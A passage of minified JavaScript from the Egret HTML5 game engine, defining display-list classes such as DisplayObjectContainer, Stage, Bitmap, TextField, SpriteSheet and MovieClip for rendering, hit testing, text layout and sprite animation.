			if (this._stage) {
				e._onRemoveFromStage();
				for (var f = c.__EVENT__REMOVE_FROM_STAGE_LIST; 0 < f.length; )
					f.shift().dispatchEventWith(d.Event.REMOVED_FROM_STAGE)
			}
			e._parentChanged(null);
			m.splice(a, 1);
			this._setSizeDirty();
			return e
		};
		c.prototype.getChildAt = function (a) {
			if (0 <= a && a < this._children.length)
				return this._children[a];
			d.Logger.fatal("\u63d0\u4f9b\u7684\u7d22\u5f15\u8d85\u51fa\u8303\u56f4");
			return null
		};
		c.prototype.contains = function (a) {
			for (; a; ) {
				if (a == this)
					return !0;
				a = a._parent
			}
			return !1
		};
		c.prototype.swapChildrenAt = function (a, b) {
			0 <= a && a < this._children.length && 0 <= b && b < this._children.length ? this._swapChildrenAt(a, b) : d.Logger.fatal("\u63d0\u4f9b\u7684\u7d22\u5f15\u8d85\u51fa\u8303\u56f4")
		};
		c.prototype.swapChildren = function (a, b) {
			var c = this._children.indexOf(a),
			e = this._children.indexOf(b);
			-1 == c || -1 == e ? d.Logger.fatal("child\u672a\u88abaddChild\u5230\u8be5parent") : this._swapChildrenAt(c, e)
		};
		c.prototype._swapChildrenAt = function (a, b) {
			if (a != b) {
				var c = this._children,
				d = c[a];
				c[a] = c[b];
				c[b] = d
			}
		};
		c.prototype.getChildIndex = function (a) {
			return this._children.indexOf(a)
		};
		c.prototype.removeChildren = function () {
			for (var a = this._children.length - 1; 0 <= a; a--)
				this._doRemoveChild(a)
		};
		c.prototype._updateTransform =
		function () {
			if (this.visible) {
				e.prototype._updateTransform.call(this);
				for (var a = 0, b = this._children.length; a < b; a++)
					this._children[a]._updateTransform()
			}
		};
		c.prototype._render = function (a) {
			for (var b = 0, c = this._children.length; b < c; b++)
				this._children[b]._draw(a)
		};
		c.prototype._measureBounds = function () {
			for (var a = 0, b = 0, c = 0, e = 0, f = this._children.length, h = 0; h < f; h++) {
				var g = this._children[h],
				l;
				if (g.visible && (l = d.DisplayObject.getTransformBounds(g._getSize(d.Rectangle.identity), g._getMatrix()))) {
					var g = l.x,
					k = l.y,
					n =
						l.width + l.x,
					q = l.height + l.y;
					if (g < a || 0 == h)
						a = g;
					if (n > b || 0 == h)
						b = n;
					if (k < c || 0 == h)
						c = k;
					if (q > e || 0 == h)
						e = q
				}
			}
			return d.Rectangle.identity.initialize(a, c, b - a, e - c)
		};
		c.prototype.hitTest = function (a, b, c) {
			"undefined" === typeof c && (c = !1);
			var u;
			if (!this.visible)
				return null;
			if (this._scrollRect) {
				if (0 > a || 0 > b || a > this._scrollRect.width || b > this._scrollRect.height)
					return null
			} else if (this.mask && (this.mask.x > a || a > this.mask.x + this.mask.width || this.mask.y > b || b > this.mask.y + this.mask.height))
				return null;
			for (var y = this._children, h =
					this._touchChildren, g = y.length - 1; 0 <= g; g--) {
				var l = y[g],
				k = l,
				n = k._getOffsetPoint(),
				q = k._x,
				p = k._y;
				this._scrollRect && (q -= this._scrollRect.x, p -= this._scrollRect.y);
				k = d.Matrix.identity.identity().prependTransform(q, p, k._scaleX, k._scaleY, k._rotation, 0, 0, n.x, n.y);
				k.invert();
				k = d.Matrix.transformCoords(k, a, b);
				if (l = l.hitTest(k.x, k.y, !0)) {
					if (l._touchEnabled && h)
						return l;
					if (this._touchEnabled)
						return this;
					null == u && (u = l)
				}
			}
			return u ? u : e.prototype.hitTest.call(this, a, b, c)
		};
		c.prototype._onAddToStage = function () {
			e.prototype._onAddToStage.call(this);
			for (var a = this.numChildren, b = 0; b < a; b++)
				this._children[b]._onAddToStage()
		};
		c.prototype._onRemoveFromStage = function () {
			e.prototype._onRemoveFromStage.call(this);
			for (var a = this.numChildren, b = 0; b < a; b++)
				this._children[b]._onRemoveFromStage()
		};
		c.prototype.getChildByName = function (a) {
			for (var b = this._children, c = this.numChildren, d, e = 0; e < c; e++)
				if (d = b[e], d.name == a)
					return d;
			return null
		};
		c.__EVENT__ADD_TO_STAGE_LIST = [];
		c.__EVENT__REMOVE_FROM_STAGE_LIST = [];
		return c
	}
	(d.DisplayObject);
	d.DisplayObjectContainer = e;
	e.prototype.__class__ =
		"egret.DisplayObjectContainer"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a, b) {
			"undefined" === typeof a && (a = 480);
			"undefined" === typeof b && (b = 800);
			e.call(this);
			this.touchEnabled = !0;
			this._stage = this;
			this._stageWidth = a;
			this._stageHeight = b
		}
		__extends(c, e);
		c.prototype.invalidate = function () {
			c._invalidateRenderFlag = !0
		};
		Object.defineProperty(c.prototype, "scaleMode", {
			get : function () {
				return this._scaleMode
			},
			set : function (a) {
				if (this._scaleMode != a) {
					this._scaleMode = a;
					var b = {};
					b[d.StageScaleMode.NO_SCALE] = new d.NoScale;
					b[d.StageScaleMode.SHOW_ALL] =
						new d.FixedWidth;
					a = b[a];
					if (!a)
						throw Error("\u4f7f\u7528\u4e86\u5c1a\u672a\u5b9e\u73b0\u7684ScaleMode");
					b = new d.EqualToFrame;
					a = new d.ResolutionPolicy(b, a);
					d.StageDelegate.getInstance()._setResolutionPolicy(a);
					a = document.getElementById(d.StageDelegate.canvas_name);
					this._stageWidth = a.width;
					this._stageHeight = a.height;
					this.dispatchEventWith(d.Event.RESIZE)
				}
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "stageWidth", {
			get : function () {
				return this._stageWidth
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "stageHeight", {
			get : function () {
				return this._stageHeight
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype.hitTest = function (a, b) {
			if (!this.touchEnabled)
				return null;
			var c;
			if (!this.visible)
				return this;
			for (var e = this._children, f = e.length - 1; 0 <= f; f--) {
				var h = c = e[f],
				g = h._getOffsetPoint(),
				h = d.Matrix.identity.identity().prependTransform(h.x, h.y, h.scaleX, h.scaleY, h.rotation, 0, 0, g.x, g.y);
				h.invert();
				h = d.Matrix.transformCoords(h, a, b);
				if ((c = c.hitTest(h.x, h.y, !0)) && c.touchEnabled)
					return c
			}
			return this
		};
		c.prototype.getBounds = function (a) {
			a || (a = new d.Rectangle);
			return a.initialize(0, 0, this._stageWidth, this._stageHeight)
		};
		c.prototype._updateTransform = function () {
			for (var a = 0, b = this._children.length; a < b; a++)
				this._children[a]._updateTransform()
		};
		c._invalidateRenderFlag = !1;
		return c
	}
	(d.DisplayObjectContainer);
	d.Stage = e;
	e.prototype.__class__ = "egret.Stage"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.NO_SCALE = "noScale";
		d.SHOW_ALL = "showAll";
		return d
	}
	();
	d.StageScaleMode = e;
	e.prototype.__class__ = "egret.StageScaleMode"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.REPEAT = "repeat";
		d.SCALE = "scale";
		return d
	}
	();
	d.BitmapFillMode = e;
	e.prototype.__class__ = "egret.BitmapFillMode"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a) {
			e.call(this);
			this.debug = !1;
			this.debugColor = 16711680;
			this.fillMode = "scale";
			a && (this._texture = a, this._setSizeDirty())
		}
		__extends(c, e);
		Object.defineProperty(c.prototype, "texture", {
			get : function () {
				return this._texture
			},
			set : function (a) {
				a != this._texture && (this._setSizeDirty(), this._texture = a)
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype._render = function (a) {
			var b = this._texture;
			b ? (this._texture_to_render = b, c._drawBitmap(a, this._hasWidthSet ? this._explicitWidth : b._textureWidth,
					this._hasHeightSet ? this._explicitHeight : b._textureHeight, this)) : this._texture_to_render = null
		};
		c._drawBitmap = function (a, b, m, e) {
			var f = e._texture_to_render;
			if (f) {
				var h = f._textureWidth,
				g = f._textureHeight;
				if ("scale" == e.fillMode) {
					var l = e.scale9Grid || f.scale9Grid;
					if (l && h - l.width < b && g - l.height < m)
						c.drawScale9GridImage(a, e, l, b, m);
					else {
						var l = f._offsetX,
						k = f._offsetY,
						n = f._bitmapWidth || h,
						q = f._bitmapHeight || g;
						b /= h;
						l = Math.round(l * b);
						b = Math.round(n * b);
						m /= g;
						k = Math.round(k * m);
						m = Math.round(q * m);
						d.RenderFilter.getInstance().drawImage(a,
							e, f._bitmapX, f._bitmapY, n, q, l, k, b, m)
					}
				} else
					c.drawRepeatImage(a, e, b, m)
			}
		};
		c.drawRepeatImage = function (a, b, c, e) {
			var f = b._texture_to_render;
			if (f)
				for (var h = f._textureWidth, g = f._textureHeight, l = f._bitmapX, k = f._bitmapY, n = f._bitmapWidth || h, q = f._bitmapHeight || g, p = f._offsetX, f = f._offsetY, r = d.RenderFilter.getInstance(); p < c; p += h)
					for (var x = f; x < e; x += g) {
						var z = Math.min(n, c - p),
						v = Math.min(q, e - x);
						r.drawImage(a, b, l, k, n, q, p, x, z, v)
					}
		};
		c.drawScale9GridImage = function (a, b, c, e, f) {
			var h = b._texture_to_render;
			if (h && c) {
				var g = d.RenderFilter.getInstance(),
				l = h._textureWidth,
				k = h._textureHeight,
				n = h._bitmapX,
				q = h._bitmapY,
				p = h._bitmapWidth || l,
				r = h._bitmapHeight || k,
				x = h._offsetX,
				h = h._offsetY;
				c = d.Rectangle.identity.initialize(c.x - Math.round(x), c.y - Math.round(x), c.width, c.height);
				x = Math.round(x);
				h = Math.round(h);
				e -= l - p;
				f -= k - r;
				c.y == c.bottom && (c.bottom < r ? c.bottom++ : c.y--);
				c.x == c.right && (c.right < p ? c.right++ : c.x--);
				var l = n + c.x,
				k = n + c.right,
				z = p - c.right,
				v = q + c.y,
				A = q + c.bottom,
				t = r - c.bottom,
				B = x + c.x,
				w = h + c.y,
				r = f - (r - c.bottom),
				p = e - (p - c.right);
				g.drawImage(a, b, n, q, c.x, c.y, x, h,
					c.x, c.y);
				g.drawImage(a, b, l, q, c.width, c.y, B, h, p - c.x, c.y);
				g.drawImage(a, b, k, q, z, c.y, x + p, h, e - p, c.y);
				g.drawImage(a, b, n, v, c.x, c.height, x, w, c.x, r - c.y);
				g.drawImage(a, b, l, v, c.width, c.height, B, w, p - c.x, r - c.y);
				g.drawImage(a, b, k, v, z, c.height, x + p, w, e - p, r - c.y);
				g.drawImage(a, b, n, A, c.x, t, x, h + r, c.x, f - r);
				g.drawImage(a, b, l, A, c.width, t, B, h + r, p - c.x, f - r);
				g.drawImage(a, b, k, A, z, t, x + p, h + r, e - p, f - r)
			}
		};
		c.prototype._measureBounds = function () {
			var a = this._texture;
			return a ? d.Rectangle.identity.initialize(a._offsetX, a._offsetY, a._textureWidth,
				a._textureHeight) : e.prototype._measureBounds.call(this)
		};
		c.debug = !1;
		return c
	}
	(d.DisplayObject);
	d.Bitmap = e;
	e.prototype.__class__ = "egret.Bitmap"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this._text = "";
			this._textChanged = !1;
			this._bitmapPool = []
		}
		__extends(c, e);
		Object.defineProperty(c.prototype, "text", {
			get : function () {
				return this._text
			},
			set : function (a) {
				this._textChanged = !0;
				this._text = a
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype._updateTransform = function () {
			this.visible && (this._textChanged && this._renderText(), e.prototype._updateTransform.call(this))
		};
		c.prototype._renderText = function (a) {
			var b = a = 0;
			this._textChanged && this.removeChildren();
			for (var c = 0, e = this.text.length; c < e; c++) {
				var f = this.text.charAt(c),
				h = this.spriteSheet.getTexture(f);
				if (null == h)
					console.log("\u5f53\u524d\u6ca1\u6709\u4f4d\u56fe\u6587\u5b57\uff1a" + f);
				else {
					var f = h._offsetX,
					g = h._offsetY,
					l = h._textureWidth;
					if (this._textChanged) {
						var k = this._bitmapPool[c];
						k || (k = new d.Bitmap, this._bitmapPool.push(k));
						k.texture = h;
						this.addChild(k);
						k.x = a
					}
					a += l + f;
					g + h._textureHeight > b && (b = g + h._textureHeight)
				}
			}
			this._textChanged = !1;
			return d.Rectangle.identity.initialize(0, 0, a, b)
		};
		c.prototype._measureBounds =
		function () {
			return this._renderText(!0)
		};
		return c
	}
	(d.DisplayObjectContainer);
	d.BitmapText = e;
	e.prototype.__class__ = "egret.BitmapText"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {
			this.commandQueue = []
		}
		d.prototype.beginFill = function (c, a) {};
		d.prototype._setStyle = function (c) {};
		d.prototype.drawRect = function (c, a, b, m) {};
		d.prototype.drawCircle = function (c, a, b) {};
		d.prototype.lineStyle = function (c, a, b, m, d, e, f, g) {};
		d.prototype.lineTo = function (c, a) {};
		d.prototype.curveTo = function (c, a, b, m) {};
		d.prototype.moveTo = function (c, a) {};
		d.prototype.clear = function () {};
		d.prototype.endFill = function () {};
		d.prototype._draw = function (c) {};
		return d
	}
	();
	d.Graphics = e;
	e.prototype.__class__ = "egret.Graphics";
	(function () {
		return function (d, c, a) {
			this.method = d;
			this.thisObject = c;
			this.args = a
		}
	})().prototype.__class__ = "Command"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this)
		}
		__extends(c, e);
		Object.defineProperty(c.prototype, "graphics", {
			get : function () {
				this._graphics || (this._graphics = new d.Graphics);
				return this._graphics
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype._render = function (a) {
			this._graphics && this._graphics._draw(a)
		};
		return c
	}
	(d.DisplayObject);
	d.Shape = e;
	e.prototype.__class__ = "egret.Shape"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this)
		}
		__extends(c, e);
		Object.defineProperty(c.prototype, "graphics", {
			get : function () {
				this._graphics || (this._graphics = new d.Graphics);
				return this._graphics
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype._render = function (a) {
			this._graphics && this._graphics._draw(a);
			e.prototype._render.call(this, a)
		};
		return c
	}
	(d.DisplayObjectContainer);
	d.Sprite = e;
	e.prototype.__class__ = "egret.Sprite"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this._fontFamily = "Arial";
			this._size = 30;
			this._textColorString = "#FFFFFF";
			this._textColor = 16777215;
			this._strokeColorString = "#000000";
			this._stroke = this._strokeColor = 0;
			this._textAlign = "left";
			this._verticalAlign = "top";
			this._numLines = this._lineSpacing = 0;
			this.measuredWidths = []
		}
		__extends(c, e);
		Object.defineProperty(c.prototype, "text", {
			get : function () {
				return this._text
			},
			set : function (a) {
				this._text != a && (this._setTextDirty(), this._text = a)
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype._setTextDirty = function () {
			this._setSizeDirty()
		};
		Object.defineProperty(c.prototype, "fontFamily", {
			get : function () {
				return this._fontFamily
			},
			set : function (a) {
				this._fontFamily != a && (this._setTextDirty(), this._fontFamily = a)
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "size", {
			get : function () {
				return this._size
			},
			set : function (a) {
				this._size != a && (this._setTextDirty(), this._size = a)
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "italic", {
			get : function () {
				return this._italic
			},
			set : function (a) {
				this._italic != a && (this._setTextDirty(), this._italic = a)
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "bold", {
			get : function () {
				return this._bold
			},
			set : function (a) {
				this._bold != a && (this._setTextDirty(), this._bold = a)
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "textColor", {
			get : function () {
				return this._textColor
			},
			set : function (a) {
				this._textColor != a && (this._setTextDirty(), this._textColor = a, this._textColorString = d.toColorString(a))
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "strokeColor", {
			get : function () {
				return this._strokeColor
			},
			set : function (a) {
				this._strokeColor != a && (this._setTextDirty(), this._strokeColor = a, this._strokeColorString = d.toColorString(a))
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "stroke", {
			get : function () {
				return this._stroke
			},
			set : function (a) {
				this._stroke != a && (this._setTextDirty(), this._stroke = a)
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "textAlign", {
			get : function () {
				return this._textAlign
			},
			set : function (a) {
				this._textAlign != a && (this._setTextDirty(), this._textAlign = a)
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "verticalAlign", {
			get : function () {
				return this._verticalAlign
			},
			set : function (a) {
				this._verticalAlign != a && (this._setTextDirty(), this._verticalAlign = a)
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "lineSpacing", {
			get : function () {
				return this._lineSpacing
			},
			set : function (a) {
				this._lineSpacing != a && (this._setTextDirty(), this._lineSpacing = a)
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "numLines", {
			get : function () {
				return this._numLines
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype._render = function (a) {
			this.drawText(a, !1);
			this._clearDirty()
		};
		c.prototype._measureBounds = function () {
			return this.drawText(d.MainContext.instance.rendererContext, !0)
		};
		c.prototype.drawText = function (a, b) {
			var c = this.getTextLines(a);
			if (!c)
				return d.Rectangle.identity.initialize(0, 0, 0, 0);
			var e = c.length,
			f = 0.5 * this._size,
			h = this._size + this._lineSpacing,
			g = e * h - this._lineSpacing;
			this._textHeight = g;
			var l = this._hasHeightSet ? this._explicitHeight : Number.POSITIVE_INFINITY;
			if (this._hasHeightSet && g < l) {
				var k = 0;
				this._verticalAlign == d.VerticalAlign.MIDDLE ? k = 0.5 : this._verticalAlign == d.VerticalAlign.BOTTOM && (k = 1);
				f += k * (l - g)
			}
			var k = f = Math.round(f),
			n = 0;
			this._textAlign == d.HorizontalAlign.CENTER ? n = 0.5 : this._textAlign == d.HorizontalAlign.RIGHT && (n = 1);
			var q = this.measuredWidths,
			p;
			p = this._hasWidthSet ? this._explicitWidth : this._textWidth;
			for (var r = Number.POSITIVE_INFINITY, x = 0; x < e; x++) {
				var z = c[x],
				v = Math.round((p - q[x]) * n);
				v < r && (r = v);
				!b && f < l && a.drawText(this, z, v, f, p);
				f += h
			}
			return d.Rectangle.identity.initialize(r, k, p, g)
		};
		c.prototype.getTextLines = function (a) {
			var b = this.text ? this.text.toString() : "";
			if (!b)
				return null;
			var c = this.measuredWidths;
			c.length = 0;
			a.setupFont(this);
			var b = b.split(/(?:\r\n|\r|\n)/),
			d = b.length,
			e = 0;
			if (this._hasWidthSet)
				for (var f = this._explicitWidth, g = 0; g < d; g++) {
					var l = b[g],
					k = a.measureText(l);
					if (k > f) {
						for (var n = "", q = 0, p = l.length, r = 0; r < p; r++) {
							var x = l.charAt(r),
							k = a.measureText(x);
							q + k > f && (0 == q ? (b.splice(g, 0, x), c[g] = k, e < k && (e = k), k = 0, x = "") : (b.splice(g, 0, n), c[g] = q, e < q && (e = q), n = "", q = 0), g++, d++);
							q += k;
							n += x
						}
						b[g] = n;
						c[g] = q
					} else
						c[g] = k, e < k && (e = k)
				}
			else
				for (g = 0; g < d; g++)
					l = b[g], k = a.measureText(l), c[g] = k, e < k && (e = k);
			this._textWidth = e;
			return b
		};
		return c
	}
	(d.DisplayObject);
	d.TextField = e;
	e.prototype.__class__ = "egret.TextField"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.DYNAMIC = "dynamic";
		d.INPUT = "input";
		return d
	}
	();
	d.TextFieldType = e;
	e.prototype.__class__ = "egret.TextFieldType"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a) {
			e.call(this);
			var b = a.bitmapData;
			this.bitmapData = b;
			this._textureMap = {};
			this._sourceWidth = b.width;
			this._sourceHeight = b.height;
			this._bitmapX = a._bitmapX - a._offsetX;
			this._bitmapY = a._bitmapY - a._offsetY
		}
		__extends(c, e);
		c.prototype.getTexture = function (a) {
			return this._textureMap[a]
		};
		c.prototype.createTexture = function (a, b, c, e, f, h, g, l, k) {
			"undefined" === typeof h && (h = 0);
			"undefined" === typeof g && (g = 0);
			"undefined" === typeof l && (l = h + e);
			"undefined" === typeof k && (k = g + f);
			var n =
				new d.Texture;
			n._bitmapData = this.bitmapData;
			n._bitmapX = this._bitmapX + b;
			n._bitmapY = this._bitmapY + c;
			n._bitmapWidth = e;
			n._bitmapHeight = f;
			n._offsetX = h;
			n._offsetY = g;
			n._textureWidth = l;
			n._textureHeight = k;
			n._sourceWidth = this._sourceWidth;
			n._sourceHeight = this._sourceHeight;
			return this._textureMap[a] = n
		};
		return c
	}
	(d.HashObject);
	d.SpriteSheet = e;
	e.prototype.__class__ = "egret.SpriteSheet"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.apply(this, arguments);
			this._placeholderText = "";
			this._edFontSize = 14;
			this._textColor = 16711680;
			this._placeholderFontSize = 14;
			this._placeholderColor = 16776960;
			this._preY = this._preX = 0
		}
		__extends(c, e);
		c.prototype._onAddToStage = function () {
			e.prototype._onAddToStage.call(this);
			var a = this.localToGlobal(),
			b = new d.StageText;
			b._open(a.x, a.y, this._explicitWidth, this._explicitHeight);
			this.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.onMouseDownHandler, this);
			this.stageText =
				b
		};
		c.prototype.setText = function (a) {
			this.stageText._setText(a)
		};
		c.prototype.getText = function () {
			return this.stageText._getText()
		};
		c.prototype.setTextType = function (a) {
			this.stageText._setTextType(a)
		};
		c.prototype.getTextType = function () {
			return this.stageText._getTextType()
		};
		c.prototype.onMouseDownHandler = function (a) {};
		c.prototype._onRemoveFromStage = function () {
			this.stageText._remove()
		};
		c.prototype._measureBounds = function () {
			return d.Rectangle.identity
		};
		c.prototype.hitTest = function (a, b, c) {
			return null
		};
		return c
	}
	(d.DisplayObject);
	d.TextInput = e;
	e.prototype.__class__ = "egret.TextInput";
	e = function () {
		function d() {}

		d.prototype.editBoxEditingDidBegin = function (c) {};
		d.prototype.editBoxEditingDidEnd = function (c) {};
		d.prototype.editBoxTextChanged = function (c, a) {};
		d.prototype.editBoxReturn = function (c) {};
		return d
	}
	();
	d.TextInputDegelete = e;
	e.prototype.__class__ = "egret.TextInputDegelete"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c(a, b) {
			d.call(this, a);
			this.charList = this.parseConfig(b)
		}
		__extends(c, d);
		c.prototype.getTexture = function (a) {
			var b = this._textureMap[a];
			if (!b) {
				b = this.charList[a];
				if (!b)
					return null;
				b = this.createTexture(a, b.x, b.y, b.width, b.height, b.offsetX, b.offsetY);
				this._textureMap[a] = b
			}
			return b
		};
		c.prototype.parseConfig = function (a) {
			a = a.split("\r\n").join("\n");
			a = a.split("\n");
			for (var b = this.getConfigByKey(a[3], "count"), c = {}, d = 4; d < 4 + b; d++) {
				var e = a[d],
				f = String.fromCharCode(this.getConfigByKey(e,
							"id")),
				g = {};
				c[f] = g;
				g.x = this.getConfigByKey(e, "x");
				g.y = this.getConfigByKey(e, "y");
				g.width = this.getConfigByKey(e, "width");
				g.height = this.getConfigByKey(e, "height");
				g.offsetX = this.getConfigByKey(e, "xoffset");
				g.offsetY = this.getConfigByKey(e, "yoffset")
			}
			return c
		};
		c.prototype.getConfigByKey = function (a, b) {
			for (var c = a.split(" "), d = 0, e = c.length; d < e; d++) {
				var f = c[d];
				if (b == f.substring(0, b.length))
					return c = f.substring(b.length + 1), parseInt(c)
			}
			return 0
		};
		return c
	}
	(d.SpriteSheet);
	d.BitmapTextSpriteSheet = e;
	e.prototype.__class__ =
		"egret.BitmapTextSpriteSheet"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (c) {
		function a(b, a) {
			c.call(this);
			this.frameRate = 60;
			b instanceof f ? (d.Logger.warning("MovieClip#constructor\u63a5\u53e3\u53c2\u6570\u5df2\u7ecf\u53d8\u66f4\uff0c\u8bf7\u5c3d\u5feb\u8c03\u6574\u7528\u6cd5\u4e3a new MovieClip(data,texture)"), this.delegate = b) : this.delegate = new f(b, a);
			this.delegate.setMovieClip(this)
		}
		__extends(a, c);
		a.prototype.gotoAndPlay = function (b) {
			this.delegate.gotoAndPlay(b)
		};
		a.prototype.gotoAndStop = function (b) {
			this.delegate.gotoAndStop(b)
		};
		a.prototype.stop =
		function () {
			this.delegate.stop()
		};
		a.prototype.dispose = function () {
			this.delegate.dispose()
		};
		a.prototype.release = function () {
			d.Logger.warning("MovieClip#release\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03");
			this.dispose()
		};
		a.prototype.getCurrentFrameIndex = function () {
			d.Logger.warning("MovieClip#getCurrentFrameIndex\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03");
			return this.delegate._currentFrameIndex
		};
		a.prototype.getTotalFrame = function () {
			d.Logger.warning("MovieClip#getTotalFrame\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03");
			return this.delegate._totalFrame
		};
		a.prototype.setInterval = function (b) {
			d.Logger.warning("MovieClip#setInterval\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03,\u8bf7\u4f7f\u7528MovieClip#frameRate\u4ee3\u66ff");
			this.frameRate = 60 / b
		};
		a.prototype.getIsPlaying = function () {
			d.Logger.warning("MovieClip#getIsPlaying\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03");
			return this.delegate.isPlaying
		};
		return a
	}
	(d.DisplayObjectContainer);
	d.MovieClip = e;
	e.prototype.__class__ = "egret.MovieClip";
	var f = function () {
		function c(a, b) {
			this.data = a;
			this._currentFrameIndex = this._passTime =
				this._totalFrame = 0;
			this._isPlaying = !1;
			this._frameData = a;
			this._spriteSheet = new d.SpriteSheet(b)
		}
		c.prototype.setMovieClip = function (a) {
			this.movieClip = a;
			this.bitmap = new d.Bitmap;
			this.movieClip.addChild(this.bitmap)
		};
		c.prototype.gotoAndPlay = function (a) {
			this.checkHasFrame(a);
			this._isPlaying = !0;
			this._currentFrameIndex = 0;
			this._currentFrameName = a;
			this._totalFrame = this._frameData.frames[a].totalFrame;
			this.playNextFrame();
			this._passTime = 0;
			d.Ticker.getInstance().register(this.update, this)
		};
		c.prototype.gotoAndStop =
		function (a) {
			this.checkHasFrame(a);
			this.stop();
			this._currentFrameIndex = this._passTime = 0;
			this._currentFrameName = a;
			this._totalFrame = this._frameData.frames[a].totalFrame;
			this.playNextFrame()
		};
		c.prototype.stop = function () {
			this._isPlaying = !1;
			d.Ticker.getInstance().unregister(this.update, this)
		};
		c.prototype.dispose = function () {};
		c.prototype.checkHasFrame = function (a) {
			void 0 == this._frameData.frames[a] && d.Logger.fatal("MovieClip\u6ca1\u6709\u5bf9\u5e94\u7684frame\uff1a", a)
		};
		c.prototype.update = function (a) {
			for (var b =
					1E3 / this.movieClip.frameRate, b = Math.floor((this._passTime % b + a) / b); 1 <= b; )
				1 == b ? this.playNextFrame() : this.playNextFrame(!1), b--;
			this._passTime += a
		};
		c.prototype.playNextFrame = function (a) {
			"undefined" === typeof a && (a = !0);
			var b = this._frameData.frames[this._currentFrameName].childrenFrame[this._currentFrameIndex];
			if (a) {
				a = this.getTexture(b.res);
				var c = this.bitmap;
				c.x = b.x;
				c.y = b.y;
				c.texture = a
			}
			null != b.action && this.movieClip.dispatchEventWith(b.action);
			this._currentFrameIndex++;
			this._currentFrameIndex == this._totalFrame &&
			(this._currentFrameIndex = 0)
		};
		c.prototype.getTexture = function (a) {
			var b = this._frameData.res[a],
			c = this._spriteSheet.getTexture(a);
			c || (c = this._spriteSheet.createTexture(a, b.x, b.y, b.w, b.h));
			return c
		};
		return c
	}
	();
	d.DefaultMovieClipDelegate = f;
	f.prototype.__class__ = "egret.DefaultMovieClipDelegate"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this)
		}
		__extends(c, e);
		c.prototype._getText = function () {
